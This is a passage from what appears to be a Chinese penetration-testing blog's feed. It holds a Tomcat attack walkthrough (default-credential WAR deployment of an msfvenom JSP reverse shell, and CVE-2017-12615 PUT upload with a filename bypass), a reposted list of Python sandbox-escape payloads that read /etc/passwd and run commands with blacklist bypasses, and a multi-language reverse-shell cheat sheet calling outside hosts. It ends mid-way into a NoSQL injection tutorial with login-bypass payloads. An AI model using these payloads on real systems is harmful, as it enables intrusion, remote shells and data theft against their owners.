id="æ”»å‡»-5">æ”»å‡»</h3><p>é¦–å…ˆè¿›å…¥é¡µé¢,ç™»å½•åå°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¸å·å¯†ç éƒ½æ˜¯tomcat</span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/2018-09-03-17-34-39å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶ådeployä¸€ä¸ªwaræ–‡ä»¶ <img src="/images/2018/07/2018-09-03-17-36-19å±å¹•æˆªå›¾.png" alt="blacsheep" /> å…¶ä¸­waræ–‡ä»¶å¯ä»¥ç”¨msfvenomç”Ÿæˆ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=your_vps_ip LPORT=your_vps_port -f raw&gt;shell.jsp</span><br></pre></td></tr></table></figure><p>ç„¶åå°±ç”Ÿæˆäº†jspçš„æœ¨é©¬ ç„¶åzipæ‰“åŒ…æˆwar</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -q -o shell.war shell.jsp</span><br></pre></td></tr></table></figure><p>ç„¶åå»éƒ¨ç½²ä¸€ä¸‹waræ–‡ä»¶,è®¿é—®ä¸€ä¸‹é¡µé¢å°±å¯ä»¥åå¼¹shellåˆ°ä½ çš„vpsä¸Šäº† <img src="/images/2018/07/2018-09-03-17-41-50å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="åˆ†æ-5">åˆ†æ</h3><p>æ¼æ´æ˜¯ç”±äºtomcatåå°çš„å¼±å£ä»¤ä»¥åŠéƒ¨ç½²åŠŸèƒ½æ‰€å¯¼è‡´çš„,è§£å†³æ–¹æ³•å¯ä»¥æ˜¯ä½¿ç”¨è¾ƒå¼ºçš„å¯†ç ,ä¸”manageé¡µé¢æœ¬æ¥æ˜¯åªå…è®¸æœ¬åœ°è®¿é—®,ç”±äºäººä¸ºçš„ä¿®æ”¹æ‰€ä»¥å¯ä»¥è¢«å…¶ä»–äººè®¿é—® æ³¨æ„å£ä»¤å¼ºåº¦ä»¥åŠä¸è¦éšæ„ä¿®æ”¹é…ç½®æ–‡ä»¶å°±å¥½</p><h2 id="cve-2017-12615tomcatç”¨putå†™shell">CVE-2017-12615(tomcatç”¨PUTå†™shell)</h2><h3 id="åŸç†-6">åŸç†</h3><p>tomcatçš„é…ç½®æ–‡ä»¶ä¸­çš„readonlyè¢«è®¾ç½®ä¸ºäº†falseå¯¼è‡´å¯ä»¥å†™å…¥æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;default&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;debug&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;0&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;listings&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure><h3 id="æ­ç¯å¢ƒ-6">æ­ç¯å¢ƒ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h3 id="æ”»å‡»-6">æ”»å‡»</h3><p>ç”¨curlæ¥putä¸€ä¸ªæ–‡ä»¶ä¸Šå» <img src="/images/2018/07/2018-09-04-09-43-43å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åputä¸€ä¸ªjspæ–‡ä»¶ä¸Šå»</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT -d @jsp.jsp &quot;http://127.0.0.1:8080/321.jsp&quot;</span><br></pre></td></tr></table></figure><p>å‘ç°405äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;</span><br><span class="line">            HTTP Status 405 â€“ Method Not Allowed</span><br><span class="line">        &lt;/title&gt;</span><br><span class="line">        &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">h1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; h2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; h3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; body &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; b &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; p &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125; a &#123;color:black;&#125; a.name &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;</span><br><span class="line">            HTTP Status 405 â€“ Method Not Allowed</span><br><span class="line">        &lt;/h1&gt;</span><br><span class="line">        &lt;hr class=&quot;line&quot;&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;b&gt;Type&lt;/b&gt; Status Report</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;b&gt;Message&lt;/b&gt; JSPs only permit GET POST or HEAD</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;b&gt;Description&lt;/b&gt; The method received in the request-line is known by the origin server but not supported by the target resource.</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;hr class=&quot;line&quot;&gt;</span><br><span class="line">        &lt;h3&gt;</span><br><span class="line">            Apache Tomcat/8.5.19</span><br><span class="line">        &lt;/h3&gt;â</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å°è¯•æ–‡ä»¶åç»•è¿‡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT -d @jsp.jsp &quot;http://127.0.0.1:8080/321.jsp/&quot;</span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¿åˆ°shell <img src="/images/2018/07/2018-09-04-10-43-47å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="åˆ†æ-6">åˆ†æ</h3><p>é“¾æ¥:<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html" title="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html</a></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>(è½¬)pythonæ²™ç›’é€ƒé€¸(payloadæ€»ç»“)</title>
      <link href="/2018/07/02/%E8%BD%ACpython%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8payload%E6%80%BB%E7%BB%93/"/>
      <url>/2018/07/02/%E8%BD%ACpython%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8payload%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>åŸåœ°å€ <a href="http://foreversong.cn/archives/1201" title="http://foreversong.cn/archives/1201">http://foreversong.cn/archives/1201</a></p><h3 id="è¯»æ–‡ä»¶">è¯»æ–‡ä»¶</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()</span><br><span class="line"><span class="comment"># &lt;type &#x27;file&#x27;&gt;è¯»å–æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><h3 id="å†™æ–‡ä»¶">å†™æ–‡ä»¶</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;123.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;asdfqwer&#x27;</span>)</span><br><span class="line"><span class="comment"># &lt;type &#x27;file&#x27;&gt;å†™æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><h3 id="å‘½ä»¤æ‰§è¡Œ">å‘½ä»¤æ‰§è¡Œ</h3><h4 id="warnings.catch_warnings">warnings.catch_warnings</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)</span><br><span class="line"><span class="comment"># &lt;class &#x27;warnings.catch_warnings&#x27;&gt;  å‘½ä»¤æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># &lt;class &#x27;warnings.catch_warnings&#x27;&gt;  å‘½ä»¤æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure><h4 id="timeit">timeit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;),number=1&quot;</span>)</span><br></pre></td></tr></table></figure><p>timeitåº“ç”¨æ¥è®¡æ—¶,è®¡ç®—å‡½æ•°çš„å®Œæˆæ—¶é—´,åé¢çš„numberè¡¨ç¤ºå‡½æ•°è¿è¡Œçš„æ¬¡æ•° è¿™ä¸ªå°±å’Œç›²æ³¨å·®ä¸å¤šäº†,ä»£ç æ‰§è¡Œä½†æ˜¯æ— å›æ˜¾,å¯ä»¥åˆ©ç”¨ç›¸ä¼¼çš„payload,æ¯”å¦‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;if [ $(whoamicut -c 1) = y ];then sleep 2;fi;&#x27;)&quot;</span>, number = <span class="number">1</span>)</span><br><span class="line"><span class="number">2.016458034515381</span></span><br><span class="line"></span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;if [ $(whoamicut -c 1) = q ];then sleep 2;fi;&#x27;)&quot;</span>, number = <span class="number">1</span>)</span><br><span class="line"><span class="number">0.009487152099609375</span></span><br></pre></td></tr></table></figure><h4 id="platform">platform</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.popen(<span class="string">&#x27;id&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,bufsize=<span class="number">1</span>).read()</span><br></pre></td></tr></table></figure><h3 id="åŸºäºé»‘åå•">åŸºäºé»‘åå•</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)].__dict__[<span class="string">&#x27;c3lzdGVt&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># ä½¿ç”¨base64ç¼–ç ç»•è¿‡</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> miscç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>(è½¬)linuxåå¼¹shellæ–¹æ³•</title>
      <link href="/2018/07/02/%E8%BD%AClinux%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95/"/>
      <url>/2018/07/02/%E8%BD%AClinux%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>æ•´ç†ä¸€ä¸‹å§,ä»¥åæ‡’å¾—åˆ°å¤„æ‰¾äº†,å­˜blogäº†</p><h3 id="bash">bash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h3 id="perl">perl</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="python">python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="php">php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="ruby">ruby</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="nc">nc</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f/bin/sh -i 2&gt;&amp;1nc 10.0.0.1 1234 &gt;/tmp/f</span><br><span class="line">nc x.x.x.x 8888/bin/shnc x.x.x.x 9999</span><br></pre></td></tr></table></figure><h3 id="java">java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5  while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h3 id="lua">lua</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><h3 id="ncä¸ç”¨-e">ncä¸ç”¨-e</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Hacker:nc -lvnp listenport</span><br><span class="line">Victim:mknod /tmp/backpipe p</span><br><span class="line">Victim:/bin/sh 0&lt;/tmp/backpipe  nc attackerip listenport 1&gt;/tmp/backpipe</span><br><span class="line">ä¸ä½¿ç”¨nc</span><br><span class="line"></span><br><span class="line">Method 1:</span><br><span class="line">Hacker: nc -nvlpp 8080</span><br><span class="line">Victim: /bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">Method 2:</span><br><span class="line">Hacker: nc -nvlpp8080</span><br><span class="line">Victim: mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe</span><br><span class="line"></span><br><span class="line">Method 3:</span><br><span class="line">Hacker: nc -nvlpp8080</span><br><span class="line">Hacker: nc -nvlpp8888</span><br><span class="line">Victim: telnet 173.214.173.151 8080  /bin/bash  telnet 173.214.173.151 8888</span><br></pre></td></tr></table></figure><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" title="https://www.waitalone.cn/linux-shell-rebound-under-way.html">https://www.waitalone.cn/linux-shell-rebound-under-way.html</a></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NOSQLæ³¨å…¥å­¦ä¹ </title>
      <link href="/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>ç»­ä¸Šä¸€ç¯‡mongodbæ³¨å…¥çš„åšå®¢,å…¶å®å¤§ä½“å·®ä¸å¤š,æ–°å¢äº†ä¸€äº›jsçš„æ³¨å…¥é—®é¢˜å’Œdriverçš„mongodb shellçš„å‘½ä»¤æ‰§è¡Œé—®é¢˜,å­¦ä¹ çš„å‚è€ƒé“¾æ¥ <a href="https://www.anquanke.com/post/id/97211" title="https://www.anquanke.com/post/id/97211">https://www.anquanke.com/post/id/97211</a></p><h3 id="æ¦‚è¿°">æ¦‚è¿°</h3><p>é¦–å…ˆè¯´ä¸‹NOSQLçš„æ³¨å…¥,NoSQLæ³›æŒ‡éå…³ç³»å‹æ•°æ®åº“,ç›¸æ¯”ä¼ ç»Ÿçš„SQLæ•°æ®åº“æœ‰æ›´å®½æ¾çš„ä¸€è‡´æ€§é™åˆ¶,å®ƒé€šè¿‡å‡å°‘å…³ç³»çº¦æŸå’Œä¸€è‡´æ€§æ£€æŸ¥æ¥æä¾›æ›´å¥½çš„æ€§èƒ½å’Œæ‰©å±•æ€§,ä½†å³ä½¿æ²¡æœ‰ä½¿ç”¨sqlçš„è¯­æ³•,å®ƒä»¬ä¾ç„¶å¯ä»¥è¢«æ”»å‡»,è€Œä¸”ç”±äºNoSQLæ³¨å…¥å¯ä»¥åœ¨ç¨‹åºè¯­è¨€ä¸­æ‰§è¡Œ,è€Œä¸æ˜¯åœ¨å£°æ˜å¼SQLè¯­è¨€ä¸­æ‰§è¡Œ,æ‰€ä»¥æ½œåœ¨çš„å½±å“è¦æ›´å¤§. NoSQLçš„è°ƒç”¨æ˜¯é€šè¿‡åº”ç”¨ç¨‹åºçš„è¯­è¨€æ¥ç¼–å†™çš„,æ‰€ä»¥è¿‡æ»¤æ‰å¸¸è§çš„HTMLç‰¹æ®Šå­—ç¬¦å¹¶ä¸èƒ½é˜»æ­¢Nosqlæ”»å‡» åˆ†ç±»æˆ‘ä»¬ç›´æ¥æŒ‰ä¼ ç»Ÿsqlåˆ†ç±»æ¥çœ‹å§</p><h3 id="nosqlæ³¨å…¥åˆ†ç±»">NoSQLæ³¨å…¥åˆ†ç±»</h3><p>(1)æ°¸çœŸå¼ ä¹Ÿå°±æ˜¯é€šè¿‡æ³¨å…¥ä»£ç ,è®©ç”Ÿæˆçš„è¡¨è¾¾å¼ç»“æœæ°¸è¿œä¸ºçœŸ,ä»è€Œç»•è¿‡è®¤è¯,å¯ä»¥è„‘è¡¥'or'1'='1 (2)è”åˆæŸ¥è¯¢ é€šè¿‡å‚æ•°æ¥æ”¹å˜æŸ¥è¯¢çš„æ•°æ®é›†æ¥ç»•è®¤è¯,è„‘è¡¥' and false union select 1,md5(1)%23 (3)javascriptæ³¨å…¥ æ–°çš„æ¼æ´,ç”±å…è®¸æ‰§è¡Œæ•°æ®ä¸­çš„jsçš„NoSQLæ•°æ®åº“å¼•å…¥. jsä½¿å¾—åœ¨æ•°æ®å¼•æ“è¿›è¡Œå¤æ‚äº‹åŠ¡å’ŒæŸ¥è¯¢æˆä¸ºå¯èƒ½ã€‚ä¼ é€’ä¸å¹²å‡€çš„ç”¨æˆ·è¾“å…¥å¯ä»¥æ³¨å…¥jsä»£ç ,å¯¼è‡´éæ³•æ•°æ®è·å–</p><h3 id="phpä¸­çš„nosqlæ³¨å…¥">phpä¸­çš„NoSQLæ³¨å…¥</h3><h4 id="é‡è¨€æ³¨å…¥">é‡è¨€æ³¨å…¥</h4><p>æ‹¿æ–‡ä¸­ä»£ç ä¸ºä¾‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://mongo:27017&quot;</span>);</span><br><span class="line"><span class="variable">$dbUsername</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$dbPassword</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line"><span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">); </span><br><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line"><span class="variable">$doc_failed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;failed.html&quot;</span>);</span><br><span class="line"><span class="variable">$doc_succeed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;succeed.html&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªç®€å•çš„ç™»å½•å¤„ç†,dataå˜é‡å­˜åœ¨æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:username[$ne]=1&amp;password[$ne]=1</span><br></pre></td></tr></table></figure><h4 id="è”åˆæŸ¥è¯¢æ³¨å…¥">è”åˆæŸ¥è¯¢æ³¨å…¥</h4><p>éšæ„çœ‹ä¸‹,è¿™ä¸ªè¿˜æ˜¯è‡ªç”±å‘æŒ¥å§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string query =&quot;&#123; username: &#x27;&quot; + post_username + &quot;&#x27;, password: &#x27;&quot; + post_password + &quot;&#x27; &#125;&quot;</span><br><span class="line">payload:</span><br><span class="line"></span><br><span class="line">username=tolkien&#x27;, $or: [ &#123;&#125;, &#123; &#x27;a&#x27;:&#x27;a&amp;password=&#x27; &#125; ]</span><br></pre></td></tr></table></figure><h4 id="javascriptæ³¨å…¥">JavaScriptæ³¨å…¥</h4><h5 